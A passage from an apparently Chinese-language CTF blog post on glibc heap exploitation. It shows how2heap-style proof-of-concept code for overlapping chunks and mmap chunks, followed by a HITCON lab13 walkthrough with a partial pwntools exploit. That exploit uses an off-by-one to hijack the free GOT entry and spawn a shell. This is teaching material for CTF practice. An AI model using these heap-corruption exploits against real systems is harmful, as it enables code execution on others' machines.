class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nchunk p2 from %p to %p"</span><span class="token punctuation">,</span> p2<span class="token punctuation">,</span>  <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p2<span class="token operator">+</span><span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nchunk p3 from %p to %p"</span><span class="token punctuation">,</span> p3<span class="token punctuation">,</span>  <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token operator">+</span><span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nchunk p4 from %p to %p"</span><span class="token punctuation">,</span> p4<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token operator">+</span><span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nchunk p5 from %p to %p\n"</span><span class="token punctuation">,</span> p5<span class="token punctuation">,</span>  <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p5<span class="token operator">+</span><span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token char">'A'</span><span class="token punctuation">,</span>real_size_p1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>p2<span class="token punctuation">,</span><span class="token char">'B'</span><span class="token punctuation">,</span>real_size_p2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>p3<span class="token punctuation">,</span><span class="token char">'C'</span><span class="token punctuation">,</span>real_size_p3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>p4<span class="token punctuation">,</span><span class="token char">'D'</span><span class="token punctuation">,</span>real_size_p4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>p5<span class="token punctuation">,</span><span class="token char">'E'</span><span class="token punctuation">,</span>real_size_p5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nLet's free the chunk p4.\nIn this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">free</span><span class="token punctuation">(</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p1 <span class="token operator">+</span> real_size_p1 <span class="token punctuation">)</span> <span class="token operator">=</span> real_size_p2 <span class="token operator">+</span> real_size_p3 <span class="token operator">+</span> prev_in_use <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">//&lt;--- BUG HERE </span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThis operation will basically create a big free chunk that wrongly includes p3\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  p6 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  real_size_p6 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p6<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nchunk p6 from %p to %p"</span><span class="token punctuation">,</span> p6<span class="token punctuation">,</span>  <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p6<span class="token operator">+</span>real_size_p6<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nchunk p3 from %p to %p\n"</span><span class="token punctuation">,</span> p3<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> p3<span class="token operator">+</span>real_size_p3<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nData inside chunk p3: \n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%s\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nLet's write something inside p6\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>p6<span class="token punctuation">,</span><span class="token char">'F'</span><span class="token punctuation">,</span><span class="token number">1500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nData inside chunk p3: \n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%s\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个示例中，先是创建了5个chunk</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后释放p4，因为p5的存在p4并不会和 topchunk 合并</p><p>在之后修改p2的size，修改为2000（p2+p3）</p><p>之后释放p2，由于对size的修改会同时释放p2和p3，在同时和p4合并成一个大chunk（size = 3000）</p><p>之后再申请了一个堆块</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">p6 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即会在原来的大chunk上切割下2000的大小为p6</p><p>其实也就是原来p2+p3的chunk，之后修改p6的内容，超出1000字节的内容就会进入p3的位置，但同时p3指针仍然存在且仍然可以使用，进而用于近一步利用。</p><h2 id="0x07-mmap-overlapping-chunks"><a href="#0x07-mmap-overlapping-chunks" class="headerlink" title="0x07 mmap_overlapping_chunks"></a>0x07 mmap_overlapping_chunks</h2><p>为了便于理解，在借鉴其他大师傅的博客的基础上在关键位置翻译了一下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">/*A primer on Mmap chunks in GLibC==================================In GLibC, there is a point where an allocation is so large that mallocdecides that we need a seperate section of memory for it, instead of allocating it on the normal heap. This is determined by the mmap_threshold var.Instead of the normal logic for getting a chunk, the system call *Mmap* is used. This allocates a section of virtual memory and gives it back to the user. Similarly, the freeing process is going to be different. Instead of a free chunk being given back to a bin or to the rest of the heap,another syscall is used: *Munmap*. This takes in a pointer of a previously allocated Mmap chunk and releases it back to the kernel. Mmap chunks have special bit set on the size metadata: the second bit. If this bit is set, then the chunk was allocated as an Mmap chunk. Mmap chunks have a prev_size and a size. The *size* represents the current size of the chunk. The *prev_size* of a chunk represents the left over spacefrom the size of the Mmap chunk (not the chunks directly belows size). However, the fd and bk pointers are not used, as Mmap chunks do not go back into bins, as most heap chunks in GLibC Malloc do. Upon freeing, the size of the chunk must be page-aligned.The POC below is essentially an overlapping chunk attack but on mmap chunks. This is very similar to https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c. The main difference is that mmapped chunks have special properties and are handled in different ways, creating different attack scenarios than normal overlapping chunk attacks. There are other things that can be done, such as munmapping system libraries, the heap itself and other things.This is meant to be a simple proof of concept to demonstrate the general way to perform an attack on an mmap chunk.For more information on mmap chunks in GLibC, read this post: http://tukan.farm/2016/07/27/munmap-madness/*/</span>    <span class="token keyword">int</span><span class="token operator">*</span> ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"这种技术依然是 overlapping 但是针对的是比较大的 (通过 mmap 申请的)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"分配大的 chunk 是比较特殊的，因为他们分配在单独的内存中，而不是普通的堆中\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"分配三个大小为 0x100000 的 chunk \n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">*</span> top_ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"第一个 mmap 块位于 Libc 上方：%p\n"</span><span class="token punctuation">,</span>top_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">*</span> mmap_chunk_2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"第二个 mmap 块位于 Libc 下方：%p\n"</span><span class="token punctuation">,</span> mmap_chunk_2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">*</span> mmap_chunk_3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"第三个 mmap 块低于第二个 mmap 块: %p\n"</span><span class="token punctuation">,</span> mmap_chunk_3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n当前系统内存布局\n"</span> \<span class="token string">"================================================\n"</span> \<span class="token string">"running program\n"</span> \<span class="token string">"heap\n"</span> \<span class="token string">"....\n"</span> \<span class="token string">"third mmap chunk\n"</span> \<span class="token string">"second mmap chunk\n"</span> \<span class="token string">"LibC\n"</span> \<span class="token string">"....\n"</span> \<span class="token string">"ld\n"</span> \<span class="token string">"first mmap chunk\n"</span><span class="token string">"===============================================\n\n"</span> \<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"第一个 mmap 的 prev_size: 0x%llx\n"</span><span class="token punctuation">,</span> mmap_chunk_3<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"第三个 mmap 的 size: 0x%llx\n\n"</span><span class="token punctuation">,</span> mmap_chunk_3<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"假设有一个漏洞可以更改第三个 mmap 的大小，让他与第二个 mmap 块重叠\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      mmap_chunk_3<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0xFFFFFFFFFD</span> <span class="token operator">&amp;</span> mmap_chunk_3<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0xFFFFFFFFFD</span> <span class="token operator">&amp;</span> mmap_chunk_2<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"现在改掉的第三个 mmap 块的大小是: 0x%llx\n"</span><span class="token punctuation">,</span> mmap_chunk_3<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"free 掉第三个 mmap 块,\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>mmap_chunk_3<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"再分配一个很大的 mmap chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">*</span> overlapping_chunk <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x300000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"新申请的 Overlapped chunk 在: %p\n"</span><span class="token punctuation">,</span> overlapping_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Overlapped chunk 的大小是: 0x%llx\n"</span><span class="token punctuation">,</span> overlapping_chunk<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> distance <span class="token operator">=</span> mmap_chunk_2 <span class="token operator">-</span> overlapping_chunk<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"新的堆块与第二个 mmap 块之间的距离: 0x%x\n"</span><span class="token punctuation">,</span> distance<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"写入之前 mmap chunk2 的 index0 写的是: %llx\n"</span><span class="token punctuation">,</span> mmap_chunk_2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"编辑 overlapping chunk 的值\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    overlapping_chunk<span class="token punctuation">[</span>distance<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1122334455667788</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"写之后第二个 chunk 的值: 0x%llx\n"</span><span class="token punctuation">,</span> mmap_chunk_2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Overlapped chunk 的值: 0x%llx\n\n"</span><span class="token punctuation">,</span> overlapping_chunk<span class="token punctuation">[</span>distance<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"新块已与先前的块重叠\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">assert</span><span class="token punctuation">(</span>mmap_chunk_2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> overlapping_chunk<span class="token punctuation">[</span>distance<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单来说就是在分配比较大的内容空间的时候，这些内容将不会被分配到heap段上，而是在libc段的附近</p><p>着这个演示示例中，获得的 mmap chunk 的大致分布为：</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">Current System Memory Layout &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;running programheap....third mmap chunksecond mmap chunkLibC....ldfirst mmap chunk&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即：根据overlapping技术，我们只要覆盖third mmap chunk的size即可overlapping second和third mmap chunk，基本原理和heap上类似，具体可看代码，不再赘述。</p><p>同样的，找个几个题目来巩固一下：</p><h3 id="HITCON-Trainging-lab13"><a href="#HITCON-Trainging-lab13" class="headerlink" title="HITCON Trainging lab13"></a>HITCON Trainging lab13</h3><p>CTFwiki上的经典老题了，HITCON yyds</p><h4 id="checksec：-2"><a href="#checksec：-2" class="headerlink" title="checksec："></a>checksec：</h4><p><img src="https://pic.imgdb.cn/item/611926da5132923bf899a507.jpg"></p><p>仍然是NO PIE和可修改got表</p><h4 id="主要逻辑"><a href="#主要逻辑" class="headerlink" title="主要逻辑"></a>主要逻辑</h4><p>叕是经典菜单选择，但是编译的时候没有去掉调试信息，ida反汇编看起来清楚很多</p><p><img src="https://pic.imgdb.cn/item/611927755132923bf89d7afb.jpg"></p><h4 id="漏洞：-2"><a href="#漏洞：-2" class="headerlink" title="漏洞："></a>漏洞：</h4><p>漏洞存在的位置并不好找，调试发现因该是edit功能存在off by one</p><p><img src="https://pic.imgdb.cn/item/611929fb5132923bf8adfca3.jpg"></p><h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><p>但是这题的堆管理和其他题有所不同，每创建一个chunk就会在heap上生成2个chunk，其中一个大小恒定为0x20，用于记录创建chunk的大小和data区起始地址，我把它称之为信息chunk。</p><p>不过释放也会一起释放</p><p>同时经过调试发现在这题在执行编辑或者打印功能时是利用信息chunk的内容填写的地址来进行打印或者编译，如果我们能控制那块地址，即可泄露真实地址的同时修改程序的关键位置</p><p>利用off by one我们可以修改下一个chunk的size来伪造chunk，具体布置如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">"00000000"</span><span class="token punctuation">)</span> <span class="token comment"># idx = 0</span>   add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">"11111111"</span><span class="token punctuation">)</span> <span class="token comment"># idx = 1</span>   edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span><span class="token string">"\x41"</span><span class="token punctuation">)</span> <span class="token comment"># off by one</span>   free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># overlapping</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>之后只要在申请一个0x30的chunk，就会出现堆重叠，大chunk中包含了他的信息chunk，使得信息chunk内部的指针可修改</p><p>将其修改到free的got表，即可泄露真实地址并再修改位system的真实地址，即可getshell</p><p><img src="https://pic.imgdb.cn/item/611a2e3f5132923bf8fc8a0b.jpg"></p><h4 id="完整exp-2"><a href="#完整exp-2" class="headerlink" title="完整exp"></a>完整exp</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>elf_name <span class="token operator">=</span> <span class="token string">"heapcreator"</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>ip <span class="token operator">=</span> <span class="token number">0</span>port <span class="token operator">=</span> <span class="token number">0</span>local <span class="token operator">=</span> <span class="token number">1</span>debug <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./'</span><span class="token operator">+</span>elf_name<span class="token punctuation">)</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./"</span> <span class="token operator">+</span> elf_name<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    p<span 